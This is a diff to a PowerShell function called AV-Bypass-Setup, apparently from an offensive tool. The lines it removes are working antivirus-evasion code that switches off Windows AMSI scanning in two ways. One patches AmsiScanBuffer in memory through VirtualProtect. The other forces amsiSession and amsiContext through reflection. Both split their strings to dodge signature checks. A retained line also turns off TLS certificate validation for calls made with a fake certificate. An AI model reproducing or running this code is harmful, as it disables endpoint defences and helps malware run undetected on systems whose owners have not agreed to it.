@@ -23,61 +23,7 @@ function AV-Bypass-Setup
 	Write-host "3 Error Forcing"
 	Write-host ""
 	
-    $menuevcmd = Read-Host -Prompt 'Set evasion option'
-	
-	switch($menuevcmd)
-	{
-			1 {
-				
-				#@mattifestation
-				
-				Write-host " "
-				Write-host "Running Reflection method"
-				
-			}
-			2 {
-                		
-				#@Tal_Liberman's Patching method
-				
-				Write-host " "
-				Write-host "Running Patching method"
-$win32 = @"
-using System.Runtime.InteropServices;
-using System;
-public class Win32 {
-[DllImport("kernel32")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibrary(string name);
-[DllImport("kernel32")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@;
-
-				Add-Type $win32
-				$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary('a'+'ms'+'i.dll'), 'Am'+'si'+'Sc'+'an'+'Bu'+'ffer')
-				$b = 0
-				[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
-				$buf = New-Object Byte[] 7
-				$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
-				[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)			
-			}
-          	      3 {
-                
-				#@_xpn_'s Error forcing method
-				
-				Write-host " "
-				Write-host "Running Error forcing method"
-						$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
-				[Ref].Assembly.GetType("System.Management.Automation.A"+"msi"+"Uti"+"ls").GetField('am'+'siS'+'ess'+'ion',"NonPublic,Static").SetValue($null, $null);
-				[Ref].Assembly.GetType("System.Management.Automation.Am"+"s"+"iU"+"tils").GetField('a'+'msiC'+'ont'+'ext',"NonPublic,Static").SetValue($null, [IntPtr]$mem)			
-			}
-		      4 {
-				Write-host " "
-				Write-host "No evasion method"		
-			}
-		default {return}
-	}
+    
 	
     #Needed for https call with fake cert
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;
